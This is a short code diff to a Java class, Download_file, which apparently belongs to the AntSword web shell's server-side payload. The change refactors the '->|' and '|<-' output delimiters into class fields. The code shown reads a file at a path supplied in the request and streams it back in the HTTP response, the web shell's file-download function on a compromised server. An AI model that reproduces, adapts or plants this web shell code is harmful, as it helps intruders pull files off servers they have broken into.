@@ -14,6 +14,8 @@ public class Download_file {
     public String encoder;
     public String cs;
     public String randomPrefix;
+    public String tag_s;
+    public String tag_e;
 
     @Override
     public boolean equals(Object obj) {
@@ -52,8 +54,8 @@ public class Download_file {
         cs = "antswordCharset";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
-        String tag_s = "->|";
-        String tag_e = "|<-";
+        tag_s = "->|";
+        tag_e = "|<-";
         String varkey1 = "antswordargpath";
         try {
             response.setContentType("text/html");
@@ -121,11 +123,11 @@ public class Download_file {
         r.reset();
         ServletOutputStream os = r.getOutputStream();
         BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
-        os.write(("->" + "|").getBytes(), 0, 3);
+        os.write(tag_s.getBytes());
         while ((n = is.read(b, 0, 512)) != -1) {
             os.write(b, 0, n);
         }
-        os.write(("|" + "<-").getBytes(), 0, 3);
+        os.write(tag_e.getBytes());
         os.close();
         is.close();
     }
